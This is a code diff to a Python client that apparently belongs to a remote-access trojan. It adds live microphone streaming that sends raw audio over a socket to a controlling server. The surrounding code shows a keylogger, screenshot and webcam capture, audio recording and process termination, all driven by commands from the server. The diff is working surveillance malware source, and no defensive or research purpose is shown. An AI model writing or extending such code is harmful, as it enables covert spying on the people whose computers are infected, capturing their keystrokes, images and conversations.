@@ -7,7 +7,6 @@ __version__ = '2.0'
 from socket import socket, AF_INET, SOCK_STREAM
 from getpass import getuser
 from datetime import datetime
-from typing import ByteString
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
 from psutil import process_iter, AccessDenied
@@ -15,8 +14,8 @@ from pynput.keyboard import Listener, KeyCode
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
-from sounddevice import OutputStream, rec, wait
-from numpy import record, save
+from sounddevice import RawInputStream, rec, wait
+from numpy import save
 from io import BytesIO
 from subprocess import getoutput
 from requests import get
@@ -151,8 +150,19 @@ class Client(object):
         else:
             self.sendHeader({"content": "[red] Error: The Klogger is not running."})
 
+    # stopping microphone streaming and sending signal to server side
+    def stopMicStream(self, args):
+        self.microphoneStream.stop()
+        self.__Client.send(b'/micstreamstop')
+
+    # sending data frame from the microphone streaming 
+    def sendMicStreamFrames(self, *args):
+        self.__Client.send(args[0])
+
+    # starting microphone streaming
     def micStream(self, args):
-        pass
+        self.microphoneStream = RawInputStream(channels=2, blocksize=4096, callback=self.sendMicStreamFrames)
+        self.microphoneStream.start()
 
     # recording microphone audio
     def micRecord(self, args):
@@ -176,6 +186,7 @@ class Client(object):
             "path": "files",
             "sucess": True
         })
+
         sleep(0.5)
         self.__Client.send(audio.getvalue())
 
@@ -311,6 +322,7 @@ class Client(object):
             "/terminateprocess": {"action": self.terminateProcess},
             "/micrecord": {"action": self.micRecord},
             "/micstream": {"action": self.micStream},
+            "/micstreamstop": {"action": self.stopMicStream},
             "/kloggerstart": {"action": self.keyloggerStart},
             "/kloggerdump": {"action": self.keyloggerDump},
             "/kloggerstop": {"action": self.keyloggerStop},
